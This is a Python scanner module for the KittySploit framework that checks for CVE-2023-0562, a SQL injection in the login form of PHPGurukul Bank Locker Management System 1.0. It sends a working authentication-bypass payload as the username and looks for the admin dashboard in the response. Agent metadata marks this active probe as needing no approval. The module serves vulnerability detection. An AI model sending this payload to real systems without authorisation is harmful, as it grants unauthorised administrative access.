#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in PHPGurukul Bank Locker Management System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Bank Locker Management System v1.0 - SQL Injection Detection',
        'description': 'A vulnerability was found in PHPGurukul Bank Locker Management System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file index.php of the component Login. The manipulation of the argument username leads to sql injection.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'blms', 'sqli', 'bypass', 'phpgurukul', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://vuldb.com/?ctiid.219716',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-0562',
            'https://vuldb.com/?id.219716',
            'https://github.com/ctflearner/ctflearner',
        ],
        'cve': 'CVE-2023-0562',
    }

    def run(self):
        path = '/banker/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=admin%27+AND+4719%3D4719--+GZHh&inputpwd=ABC&login=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('BLMS | Dashboard',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Bank Locker Management System v1.0 - SQL Injection detected', path=path)
            return True
        return False

